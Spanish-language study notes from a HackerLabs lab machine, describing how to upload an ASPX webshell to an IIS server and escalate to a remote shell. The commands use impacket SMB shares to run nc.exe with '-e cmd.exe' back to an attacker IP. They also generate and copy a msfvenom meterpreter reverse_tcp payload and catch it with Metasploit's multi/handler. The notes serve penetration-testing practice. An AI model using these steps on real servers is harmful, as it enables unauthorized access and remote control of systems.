- Tags : #webshell #iis #aspx #upload_shell #window #window_explotacion #window_reverse_shell #recursos #recursos_hackerlabs #impacket #nc 

Acceder remotamente a un servidor con *IIS (Internet Information Service)*, subiendo archivos maliciosos aspx

**Recurso**: Maquina Cocido Andaluz HackerLabs

```bash

find / -name cmdasp.aspx 2>/dev/null

#Esto nos encuentra en nuestro kali un file aspx malicioso que nos permite una ejecucion de comando en la pagina vale destacar que se puede crear tambien con msfvenom. este archivo lo debemos subir al servidor IIS si permite la carga de este tipo de archivos

#Ruta de webshells que vienen con cali
/usr/share/webshells/

find / -name nc.exe 2>/dev/null

#Kali tambien cuenta con ejecutables ya preparados para windows
/usr/share/windows-resources/binaries/


```

![](../../../attachments/Pasted%20image%2020260213130716.png)

Levantar un recurso compartido con impacket

```bash

impacket-smbserver nombre direccion

impacket-smbserver share $(pwd) -smb2support

```

Nos ponemos a la escucha con nc

```bash
nc -nlpv 4444
```

En la pagina .aspx que subimos insertamos comando para acceder al recurso compartido con impacket y acceder al nc para establecer una conexión con nuestra maquina a la escucha 
```bash
\\ip_attacker\nombre_recurso\nc.exe #Nombre de recurso creado con impacket

#Ejemplo de acceso a nc y lo ejecutamos desde ahi 
\\ip_attacker\share\nc.exe -e cmd.exe ip_attacker port

\\192.168.4.66\share\nc.exe -e cmd.exe 192.168.4.66 4444

```

Medienate esta tecnica tambien podemos ejecutarnos una reverse shell generada con msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.66 LPORT=444 -f exe -o shell.exe
```

Hacemos exactamente lo mismo que antes o podemos intentar descargar desde la cmd obtenida anteriormente el archivo con la reverse shell
```bash
impacket-smbserver share $(pwd) -smb2support
```

Accedemos al recurso desde la consola obtenida con anterioridad , nos ubicamos en una dirección donde tengamos permiso de escritura y accedemos al recurso. Recomendado c:\windows\temp

```bash

#Nos copiamos el shell.exe a la maquina victima desde la consola obtenida anterirmente.
copy \\192.168.4.66\share\shell.exe shell.exe


#Nos ponemos a escuchar con metaesploit
msfconsole
>use multi/handler
>show options
>set LHOST ip_attacker
>set LPORT port mismo utilizado al crear shell.exe (4444)
>set PAYLOAD mismo utilizado al crear shell.exe (windows/meterpreter/reverse_tcp)
>run


#Desde la maquina victima ejecutar shell.exe
shell.exe
```